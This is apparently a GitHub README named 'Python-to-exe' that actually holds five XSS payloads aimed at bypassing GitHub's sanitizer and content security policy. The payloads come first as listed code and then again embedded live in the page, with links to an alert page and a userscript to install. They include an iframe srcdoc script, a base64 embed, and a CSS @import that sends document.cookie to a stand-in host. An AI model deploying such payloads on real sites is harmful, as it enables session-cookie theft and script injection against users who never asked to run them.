# Python-to-exe

## 🎯 Top 5 Context-Challenging XSS Payloads

Testing different contexts where GitHub's defenses may fail:

### 1. The Null-Byte Separator
Tests if WAF/Sanitizer can be confused by a null-byte (`%00`) inserted to bypass regex/string matching:

```html
<iframe%00/srcdoc="&amp;lt;script&amp;gt;alert('hi bearert0ken')&amp;lt;/script&amp;gt;">
```

### 2. The Embed Tag Variant (Base64)
Tests if sanitizer misses the less-common `embed` tag with `data:` URI:

```html
<embed/src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGkgYmVhcmVydDBrZW4nKTwvc2NyaXB0Pg==">
```

### 3. CSS @import Exfiltration (Non-Script CSP Bypass)
Tests if external CSS `@import` is allowed to exfiltrate data:

```html
<style>@import url("https://example.com/log?cookie="+document.cookie);</style>
```

### 4. The Obscure `<isindex>` Element
Tests for old, forgotten HTML element that WAFs might miss:

```html
<isindex/action="https://example.com/exfil">
```

### 5. Double-Encoded Onerror with URL-Encoded Space
Tests if attribute escaping is flawed with mixed encoding:

```html
<img/src=x%20onerror=&quot;fetch('https://example.com')&quot;>
```

## Direct Methods (If Above Don't Work):

[Click for Alert (Raw HTML)](https://raw.githubusercontent.com/bearertoken1/Python-to-exe/main/alert.htm)

[GitHub Pages Alert](https://bearertoken1.github.io/Python-to-exe/)

[Install Userscript](https://github.com/bearertoken1/Python-to-exe/raw/main/github-alert.user.js)

---

## Live Payload Tests (Below):

<!-- Payload 1: Null-Byte Separator -->
<iframe%00/srcdoc="&amp;lt;script&amp;gt;alert('hi bearert0ken')&amp;lt;/script&amp;gt;"></iframe>

<!-- Payload 2: Embed Tag with Base64 Data URI -->
<embed/src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGkgYmVhcmVydDBrZW4nKTwvc2NyaXB0Pg==">

<!-- Payload 3: CSS @import (tests non-script CSP bypass) -->
<style>@import url("https://example.com/log?cookie="+document.cookie);</style>

<!-- Payload 4: Obscure isindex element -->
<isindex/action="https://example.com/exfil">

<!-- Payload 5: Double-Encoded Onerror -->
<img/src=x%20onerror=&quot;fetch('https://example.com')&quot;>
